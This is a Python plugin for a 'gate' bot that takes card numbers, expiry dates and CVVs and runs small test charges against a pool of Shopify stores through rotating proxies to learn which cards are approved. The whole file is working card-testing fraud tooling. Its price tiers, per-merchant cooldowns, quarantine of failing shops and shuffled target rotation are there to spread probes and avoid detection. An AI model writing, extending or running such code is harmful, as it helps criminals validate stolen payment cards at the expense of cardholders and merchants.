# language: Python 3.12+, file: bot/gates/shopify.py, target: Windows 11
# Shopify gate bot plugin — matches SkyBots / storegate.py contract.
# Target pool loaded from PUSTO_SHOPIFY_TARGETS or data/shopify_targets.txt.
# Full price tier support (/sh [1|5|20|low|mid|high] cc).
import asyncio
import json
import os
import random
from pathlib import Path

from curl_cffi.requests import AsyncSession
import gate_client as gc
from shopify_gate import check_target, MAX_PRICE_CENTS
import pusto_logger as log

NAME = "shopify"
COST = 2

_sem = asyncio.Semaphore(5)
_health: dict[str, dict] = {}

PRICE_TIERS = {
    "1": (0, 100),         # <= $1
    "5": (101, 500),       # $1.01 - $5
    "20": (501, 2000),     # $5.01 - $20
    "low": (0, 200),       # <= $2
    "mid": (201, 600),     # $2.01 - $6
    "high": (601, 2000),   # $6.01 - $20
}


def parse_tier(token: str) -> tuple[int, int] | None:
    """Parse tier token ('/sh 1 cc...', '/sh low cc...'). Returns (min_cents, max_cents) or None."""
    return PRICE_TIERS.get(str(token).strip().lower())


_cache_gates: dict = {"mtime": 0.0, "data": []}
_cache_targets: dict = {"mtime": 0.0, "data": []}


def _load_gates() -> list[dict]:
    p = os.path.join(os.path.dirname(__file__), "..", "..", "data", "shopify_gates.json")
    try:
        mt = os.path.getmtime(p)
        if mt != _cache_gates["mtime"] or not _cache_gates["data"]:
            with open(p, encoding="utf-8") as f:
                _cache_gates["data"] = json.load(f)
            _cache_gates["mtime"] = mt
        return _cache_gates["data"]
    except Exception:
        return []


def _load_targets_raw() -> list[str]:
    t = os.environ.get("PUSTO_SHOPIFY_TARGETS", "")
    if t:
        return [x.strip().rstrip("/") for x in t.split(",") if x.strip()]
    p = os.path.join(os.path.dirname(__file__), "..", "..", "data", "shopify_targets.txt")
    if not os.path.exists(p):
        return []
    try:
        mt = os.path.getmtime(p)
        if mt != _cache_targets["mtime"] or not _cache_targets["data"]:
            with open(p, encoding="utf-8") as f:
                _cache_targets["data"] = [ln.strip().rstrip("/") for ln in f if ln.strip().startswith("http")]
            _cache_targets["mtime"] = mt
        return list(_cache_targets["data"])
    except Exception:
        return []


def _cheapest_map() -> dict[str, int]:
    """domain -> cheapest_cents from data/shopify_gates.json."""
    return {
        g["domain"]: int(g["cheapest_cents"])
        for g in _load_gates()
        if g.get("domain") and g.get("cheapest_cents") is not None
    }


def _dead_domains() -> set[str]:
    """Return dead/blocked domains from data/shopify_gates.json.
    verified=False — боевая смерть по probe-верификации (нет записей без флага
    после полного прогона пула; отсутствие флага = не проверялся, не отсекается)."""
    return {
        g.get("domain")
        for g in _load_gates()
        if g.get("dead_surface") or g.get("phantom") or g.get("blocked")
        or g.get("verified") is False
    } - {None}


def _unchecked_domains() -> set[str]:
    """Витринные кандидаты без боевой верификации (needs_live_check).

    Флаг — запрос на проверку, а не приговор: магазин, уже прошедший боевой
    прогон (verified=True), остаётся в ротации."""
    return {
        g.get("domain")
        for g in _load_gates()
        if g.get("needs_live_check") and not g.get("verified")
    } - {None}


def _targets(tier: tuple[int, int] | None = None) -> list[str]:
    """Load Shopify targets from env or data/shopify_targets.txt, filtering by tier and health."""
    targets = _load_targets_raw()
    dead = _dead_domains()
    if dead:
        targets = [
            t2 for t2 in targets
            if t2.replace("https://", "").replace("http://", "").rstrip("/") not in dead
        ]

    unchecked = _unchecked_domains()
    if unchecked:
        targets = [
            t2 for t2 in targets
            if t2.replace("https://", "").replace("http://", "").rstrip("/") not in unchecked
        ]

    if tier is not None:
        lo, hi = tier
        cmap = _cheapest_map()
        targets = [
            t2 for t2 in targets
            if cmap.get(t2.replace("https://", "").replace("http://", "").rstrip("/")) is not None
            and lo <= cmap[t2.replace("https://", "").replace("http://", "").rstrip("/")] <= hi
        ]
    return targets


COOLDOWN_SEC = 15.0       # анти-долбёжка: минимум 15с паузы на мерчанта
QUARANTINE_SEC = 300.0    # 5 минут карантина при серии сбоев
MAX_FAILS = 2             # 2 сбоя подряд -> карантин

_in_flight: set[str] = set()
_last_used: dict[str, float] = {}
_fails: dict[str, int] = {}
_quarantined_until: dict[str, float] = {}
_decks: dict[str, list[str]] = {}


def _pick_target(targets: list[str], tier_key: str = "default") -> str:
    """Smart anti-hammering rotator:
    1. Circuit-breaker: excludes quarantined targets (fails >= 2, 300s quarantine).
    2. In-flight exclusion: targets currently executing are skipped for concurrent requests.
    3. Cooldown: targets used within COOLDOWN_SEC (15s) are deprioritized.
    4. Shuffle-bag: targets are consumed from a shuffled deck to guarantee 100% even coverage.
    """
    if not targets:
        raise RuntimeError("No Shopify targets available")

    import time
    now = time.monotonic()

    # 1. Фильтруем карантин (сбойные мерчанты)
    active = [t for t in targets if _quarantined_until.get(t, 0) <= now]
    if not active:
        active = targets

    # 2. Фильтруем in-flight (прямо сейчас занятые параллельным чеком)
    available = [t for t in active if t not in _in_flight]
    if not available:
        available = active

    # 3. Фильтруем cooldown (остывание мерчанта)
    ready = [t for t in available if now - _last_used.get(t, 0) >= COOLDOWN_SEC]
    candidates = ready if ready else available

    # 4. Shuffle-bag (колода без повторов)
    deck = _decks.get(tier_key, [])
    valid_deck = [t for t in deck if t in candidates]
    if not valid_deck:
        shuffled = list(candidates)
        random.shuffle(shuffled)
        valid_deck = shuffled

    chosen = valid_deck.pop(0)
    _decks[tier_key] = valid_deck
    _in_flight.add(chosen)
    _last_used[chosen] = now
    return chosen


def _release_target(target: str, success: bool = True):
    """Release in-flight lock, update cooldown and failure counter."""
    import time
    _in_flight.discard(target)
    now = time.monotonic()
    _last_used[target] = now
    if success:
        _fails[target] = 0
    else:
        f = _fails.get(target, 0) + 1
        _fails[target] = f
        if f >= MAX_FAILS:
            _quarantined_until[target] = now + QUARANTINE_SEC


def _normalize(cc: str, mm: str, yy: str, cvv: str) -> str | None:
    """Normalize card parameters into canonical CC|MM|YYYY|CVV string with Luhn verification."""
    cc_clean = "".join(ch for ch in str(cc) if ch.isdigit())
    if not (13 <= len(cc_clean) <= 19) or not gc.check_luhn(cc_clean):
        return None
    try:
        month = int(str(mm).strip().lstrip("0") or "0")
    except ValueError:
        return None
    if not (1 <= month <= 12):
        return None
    year = str(yy).strip()
    if len(year) == 2:
        year = "20" + year
    if not (len(year) == 4 and year.isdigit()):
        return None
    return f"{cc_clean}|{month:02d}|{year}|{str(cvv).strip()}"


async def gate(
    cc: str, mm: str, yy: str, cvv: str, tier: str | None = None
) -> tuple[str, str, dict] | tuple[str, str]:
    """Bot gate interface: async gate(cc, mm, yy, cvv, tier=None) -> (verdict, detail, extra)."""
    raw = _normalize(cc, mm, yy, cvv)
    if raw is None:
        return ("INVALID", "bad card format / Luhn fail")

    t_window = parse_tier(tier) if tier else None
    if tier and t_window is None:
        return ("ERROR", f"Unknown price tier '{tier}' (available: 1, 5, 20, low, mid, high)")

    targets = _targets(tier=t_window)
    if not targets:
        return (
            "ERROR",
            f"No Shopify targets in price tier {tier} (check PUSTO_SHOPIFY_TARGETS / data/shopify_targets.txt)",
        )

    max_price = t_window[1] if t_window else MAX_PRICE_CENTS
    async with _sem:
        target = _pick_target(targets, tier_key=str(tier or "default"))
        is_success = False
        try:
            proxy_pool = gc.load_proxies()
            proxy = gc.pick_proxy(proxy_pool, None)
            log.log_target("shopify", target, f"tier={tier or 'default'}, max_price={max_price}c")
            log.log_proxy("Using proxy for shopify", proxy)
            t0 = asyncio.get_event_loop().time()
            try:
                res = await check_target(target, raw, proxy, max_price)
            except Exception as e:
                err_str = str(e).lower()
                if proxy and ("proxy" in type(e).__name__.lower() or "curl: (97)" in err_str or "curl: (7)" in err_str or "curl: (28)" in err_str):
                    log.log_proxy("Proxy error in shopify, retrying with alt proxy", proxy)
                    try:
                        from proxy_manager import ProxyPool
                        pp = ProxyPool()
                        pp.mark_bad(proxy)
                    except Exception:
                        pass
                    try:
                        alt_proxy = gc.pick_proxy(proxy_pool, None)
                        if alt_proxy == proxy:
                            alt_proxy = None
                        res = await check_target(target, raw, alt_proxy, max_price)
                        proxy = alt_proxy
                    except Exception as inner_e:
                        h = _health.setdefault(target, {"lat_ms": None, "fails": 0})
                        h["fails"] += 1
                        log.log_error("shopify", f"Inner retry failed: {inner_e}", exc=inner_e)
                        return ("ERROR", f"{type(inner_e).__name__}: {inner_e}"[:180])
                else:
                    h = _health.setdefault(target, {"lat_ms": None, "fails": 0})
                    h["fails"] += 1
                    log.log_error("shopify", f"Check target failed on {target}: {e}", exc=e)
                    return ("ERROR", f"{type(e).__name__}: {e}"[:180])

            lat = int((asyncio.get_event_loop().time() - t0) * 1000)
            log.log_gate("shopify", f"Finished check on {target}: {res.get('status')} | {res.get('detail')} ({lat}ms)")

            # Если check_target вернул ERROR из-за прокси — штрафуем узел и повторяем с резервным
            det = str(res.get("detail", "")).lower()
            if proxy and res.get("status") == "ERROR" and any(k in det for k in ("proxy", "curl: (97)", "curl: (7)", "curl: (28)", "connection closed")):
                try:
                    from proxy_manager import ProxyPool
                    pp = ProxyPool()
                    pp.mark_bad(proxy)
                except Exception:
                    pass
                try:
                    alt_proxy = gc.pick_proxy(proxy_pool, None)
                    if alt_proxy == proxy:
                        alt_proxy = None
                    res = await check_target(target, raw, alt_proxy, max_price)
                    proxy = alt_proxy
                except Exception:
                    pass

            status = res.get("status", "ERROR")
            # Настоящий ответ эмитента (DECLINED, APPROVED, INVALID и т.д.) = успех связности мерчанта
            is_success = status not in ("ERROR", "UNKNOWN")
            h = _health.setdefault(target, {"lat_ms": None, "fails": 0})
            h["lat_ms"] = lat
            if is_success:
                h["fails"] = 0
            else:
                h["fails"] += 1

            return (
                status,
                f"[{res.get('amount_cents', 0)}c {res.get('currency', 'USD')}] "
                f"{str(res.get('detail', ''))[:160]}",
                {"proxy": proxy, "target": target, "lat_ms": lat},
            )
        finally:
            _release_target(target, success=is_success)
